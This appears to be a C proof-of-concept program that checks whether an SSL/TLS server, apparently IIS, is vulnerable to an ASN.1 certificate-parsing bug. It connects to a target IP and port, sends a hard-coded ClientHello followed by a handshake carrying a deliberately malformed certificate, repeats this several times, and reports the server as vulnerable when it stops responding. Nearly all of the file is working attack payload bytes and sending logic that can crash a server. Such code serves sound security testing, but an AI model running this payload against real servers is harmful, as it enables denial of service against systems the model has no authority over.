/* jwlampe ... horky way to test for ASN bug....maybe????? */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <ctype.h>
#include <string.h>
#include <sys/signal.h>
#include <arpa/nameser.h>
#include <sys/time.h>
#include <time.h>
#include <errno.h>

char buf[8192];

// client hello
const char req[] =
"\x16\x03\x00\x00\x55\x01\x00\x00\x51\x03\x00\xFF\xFF\xFF\xFF\x11"
"\x22\x33\x44\x11\x22\x33\x44\x11\x22\x33\x44\x11\x22\x33\x44\x11"
"\x22\x33\x44\x11\x22\x33\x44\x11\x22\x33\x44\x00\x00\x2A\x00\x16"
"\x00\x13\x00\x0A\x00\x66\x00\x07\x00\x05\x00\x04\x00\x65\x00\x64"
"\x00\x63\x00\x62\x00\x61\x00\x60\x00\x15\x00\x12\x00\x09\x00\x14"
"\x00\x11\x00\x08\x00\x06\x00\x03\x01\x00";


// ssl w/ cert (bogus ASN.1)
const char req2[] = 
"\x16\x03\x00\x02\x47\x01\x00\x02\x43\x00\x02\x40\x00\x02\x3D\x30"
"\xA0\x09\x30\x07\xA1\x05\x23\x03\x03\x01\x07\x02\x02\x01\x00\x30"
"\x0D\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x01\x04\x05\x00\x30\x57"
"\x31\x0B\x30\x09\x06\x03\x55\x04\x06\x13\x02\x50\x4C\x31\x13\x30"
"\x11\x06\x03\x55\x04\x08\x13\x0A\x53\x6F\x6D\x65\x2D\x53\x74\x61"
"\x74\x74\x31\x1F\x30\x1D\x06\x03\x55\x04\x0A\x13\x16\x53\x74\x75"
"\x6E\x6E\x65\x6C\x20\x44\x65\x76\x65\x6C\x6F\x70\x65\x72\x73\x20"
"\x4C\x74\x64\x31\x12\x30\x10\x06\x03\x55\x04\x03\x13\x09\x6C\x6F"
"\x63\x61\x6C\x68\x6F\x73\x74\x30\x1E\x17\x0D\x30\x33\x30\x36\x31"
"\x32\x32\x33\x35\x30\x34\x39\x5A\x17\x0D\x30\x34\x30\x36\x31\x31"
"\x32\x33\x35\x30\x34\x39\x5A\x30\x57\x31\x0B\x30\x09\x06\x03\x55"
"\x04\x06\x13\x02\x50\x4C\x31\x13\x30\x11\x06\x03\x55\x04\x08\x13"
"\x0A\x53\x6F\x6D\x65\x2D\x53\x74\x61\x74\x65\x31\x1F\x30\x1D\x06"
"\x17\x55\x04\x0A\x13\x16\x53\x74\x75\x6E\x6E\x65\x6C\x20\x44\x65"
"\x76\x65\x6C\x6F\x70\x65\x72\x73\x20\x4C\x74\x64\x31\x12\x30\x10"
"\x06\x03\x55\x04\x03\x13\x09\x6C\x6F\x63\x61\x6C\x68\x6F\x73\x74"
"\x30\x81\x9F\x30\x0D\x06\x09\x2A\x86\x48\x86\xF7\x0D\x01\x01\x01"
"\x0E\x00\x03\x81\x8D\x00\x30\x81\x89\x02\x81\x81\x00\xE6\x95\x5C"
"\xC0\xCB\x03\x78\xF1\x1E\xAA\x45\xB7\xA4\x10\xD0\xC1\xD5\xC3\x8C"
"\xCC\xCA\x17\x7B\x48\x9A\x21\xF2\xFA\xC3\x25\x07\x0B\xB7\x69\x17"
"\xCA\x59\xF7\xDF\x67\x7B\xF1\x72\xD5\x05\x61\x73\xE8\x70\xBF\xB9"
"\xFA\xC8\x4B\x03\x41\x62\x71\xF9\xF5\x4E\x28\xB8\x3B\xE4\x33\x76"
"\x47\xCC\x1E\x04\x71\xDA\xC4\x0B\x05\x46\xF4\x52\x72\x99\x43\x36"
"\xF7\x37\x6D\x04\x1C\x7A\xDE\x2A\x0C\x45\x4A\xB6\x48\x33\x3A\xAD"
"\xEC\x16\xCC\xE7\x99\x58\xFD\xEF\x4C\xC6\xDD\x39\x76\xB6\x50\x76"
"\x2A\x7D\xA0\x20\xEE\xB4\x2C\xE0\xD2\xC9\xA1\x2E\x31\x02\x03\x01"
"\x00\x01\xA3\x15\x30\x13\x30\x11\x06\x09\x60\x86\x48\x01\x86\xF8"
"\x42\x01\x01\x5B\x04\x03\x02\x06\x40\x30\x0D\x06\x09\x2A\x86\x48"
"\x86\xF7\x0D\x01\x01\x04\x05\x00\x03\x81\x81\x00\x9F\xFF\xA9\x93"
"\x70\xB9\xAE\x48\x47\x09\xA1\x11\xBF\x01\x34\xBF\x1F\x1E\xED\x88"
"\x3E\x57\xE0\x37\x72\x0D\xEC\xC7\x21\x44\x12\x99\x3A\xFA\xAF\x79"
"\x57\xF4\x7F\x99\x68\x37\xB1\x17\x83\xD3\x51\x44\xBD\x50\x67\xF8"
"\xD6\x8E\x93\x00\xBB\x53\x3D\xE2\x3D\x34\xFC\xED\x60\x85\xEA\x67"
"\x7F\x91\xEC\xFA\xE3\xD8\x78\xA2\xF4\x61\xFA\x77\xA3\x3F\xE4\xB1"
"\x41\x95\x47\x23\x03\x1C\xBF\x2E\x40\x77\x82\xEF\xA0\x17\x82\x85"
"\x03\x90\x35\x4E\x85\x0D\x0F\x4D\xEA\x16\xF5\xCE\x15\x21\x10\xF9"
"\x56\xD0\xA9\x08\xE5\xF9\x9D\x5C\x43\x75\x33\xE2\x16\x03\x00\x00"
"\x84\x10\x00\x00\x80\x6E\xE4\x26\x03\x97\xB4\x5D\x58\x70\x36\x98"
"\x31\x62\xD4\xEF\x7B\x4E\x53\x99\xAD\x72\x27\xAF\x05\xD4\xC9\x89"
"\xCA\x04\xF1\x24\xA4\xA3\x82\xB5\x89\x3A\x2E\x8F\x3F\xF3\xE1\x7E"
"\x52\x11\x2A\xF2\x29\x95\xE0\xB0\xE9\x3F\x29\xAF\xC1\xCD\x77\x54"
"\x6A\xEB\xF6\x81\x6B\xD5\xD6\x0A\x3D\xC3\xFF\x6F\x76\x4A\xF7\xC9"
"\x61\x9F\x7B\xB3\x25\xE0\x2B\x09\x53\xCF\x06\x1C\x82\x9C\x30\x37"
"\xFA\x71\x27\x97\xEC\xAE\x6F\x4F\x75\xB1\xA5\x84\x99\xF5\x3A\x8C"
"\xBA\x0F\xD5\x33\x31\x61\x5D\x95\x77\x65\x8D\x89\x0C\x7D\xA7\xA8"
"\x95\x5A\xC7\xB8\x35\x16\x03\x00\x00\x86\x0F\x00\x00\x82\x00\x80"
"\x78\x1D\xBD\x86\xCB\x6E\x06\x88\x57\x9E\x3D\x21\x7E\xCA\xD1\x75"
"\xFF\x33\xEF\x48\x4D\x88\x96\x84\x8C\x2F\xFB\x92\x1D\x15\x28\xEF"
"\xE0\xD3\x4D\x20\xE9\xAE\x6C\x5C\xED\x46\xC0\xEF\x4E\xB4\xE4\xCF"
"\xE9\x73\xB8\xD2\x8B\xE6\x5E\xB9\x0C\x67\xBE\x17\x13\x31\x3F\xE5"
"\xE1\xD9\x2D\xFE\xB4\xD6\xDB\x8F\xBC\x15\x22\x10\x65\xE1\xAD\x5F"
"\x00\xD0\x48\x8D\x4E\xA7\x08\xBD\x5C\x40\x77\xB8\xA9\xBE\x58\xB0"
"\x15\xD2\x4C\xC8\xA1\x79\x63\x25\xEB\xA1\x32\x61\x3B\x49\x82\xF1"
"\x3A\x70\x80\xF8\xDC\xF7\xF9\xFC\x50\xC7\xA2\x5D\xE4\x30\x8E\x09"
"\x14\x03\x00\x00\xC1\x01\x16\x03\x00\x00\x40\xFE\xC2\x1F\x94\x7E"
"\xF3\x0B\xD1\xE1\x5C\x27\x34\x7F\x01\xE9\x51\xD3\x18\x33\x9A\x99"
"\x48\x6E\x13\x6F\x82\xB2\x23\xA5\x7B\x36\x5D\x85\xF5\x17\xE3\x4F"
"\x2A\x04\x15\x2D\x0E\x2F\x2C\xF9\x1C\xF8\x9E\xAC\xD5\x6C\x20\x81"
"\xE5\x22\x54\xF1\xE1\xD0\xFD\x64\x42\xFB\x34"
;

#define CRAPLEN (sizeof(req)-1)
#define CRAPLEN2 (sizeof(req2)-1)










int main(int argc, char *argv[]) {
	struct sockaddr_in addr;
	int s, port = 0, first = 1, mu, q;
	char *host = NULL;

	
	if (argc != 3) {
		fprintf(stderr, "Use: %s [ip] [port]\n", argv[0]);
		exit(1);
	}

	host = argv[1];
	port = atoi(argv[2]);
	if ((port < 1) || (port > 65535)) {
		fprintf(stderr, "Port out of range (%d)\n", port);
		exit(1);
	}

        for (q=0; q<4; q++) {
	    memset(&addr, 0, sizeof(addr));


	    signal(SIGPIPE, SIG_IGN); /* Ignore SIGPIPE */

	    if ((s = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		fprintf(stderr, "Socket error: %s\n", strerror(errno));
		exit(0);
	    }
	    addr.sin_family = AF_INET;
	    addr.sin_port = htons(port);
	    addr.sin_addr.s_addr = inet_addr(host);
	    if (connect(s, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
		fprintf(stderr, "Unable to connect: %s\n", strerror(errno));
	    }

	    write(s, req, CRAPLEN);
	    
	    if ((mu=recv(s,buf,sizeof(buf),0))<=0) {
		    if (q == 0) {
			    exit(0);                   // iis without cert won't respond to hello
	            } else {
		            fprintf(stderr, "Server is Vulnerable.\n");
			    exit(0);
	            }
	    }
   
	    write(s, req2, CRAPLEN2);
	    close(s);
	    if (q == 0) sleep (2);                      // whacky, but in some testing IIS hiccupped right here 
	}
	fprintf(stderr, "Server is NOT vulnerable\n");
	exit(0);
}

